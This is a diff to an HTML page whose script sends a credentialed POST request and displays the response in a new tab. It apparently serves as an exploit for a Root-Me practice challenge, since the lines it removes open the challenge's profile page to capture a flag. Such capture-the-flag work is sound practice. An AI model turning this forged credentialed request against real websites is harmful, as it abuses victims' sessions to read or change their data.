@@ -12,11 +12,28 @@ setTimeout(function(){
   http.open('POST', url, true);
   http.withCredentials = true
   http.setRequestHeader('Content-type', 'text/plain');
+
+http.onload = function () {
+  if (http.status >= 200 && http.status < 300) {
+    // Créer un nouvel onglet
+    var newTab = window.open();
+    newTab.document.open();
+    // Si c'est du JSON, mieux vaut le formatter
+    try {
+      var json = JSON.parse(http.responseText);
+      newTab.document.write("<pre>" + JSON.stringify(json, null, 2) + "</pre>");
+    } catch (e) {
+      // Sinon afficher brut
+      newTab.document.write(http.responseText);
+    }
+    newTab.document.close();
+  } else {
+    alert("Erreur HTTP : " + http.status);
+  }
+};
+
   http.send(params);
 },1000);
-setTimeout(function(){
-  window.open('https://web-client-ch6.challenge01.root-me.org:58006/profile', 'test_flag');
-},2000);
 </script>
 </body>
 </html>
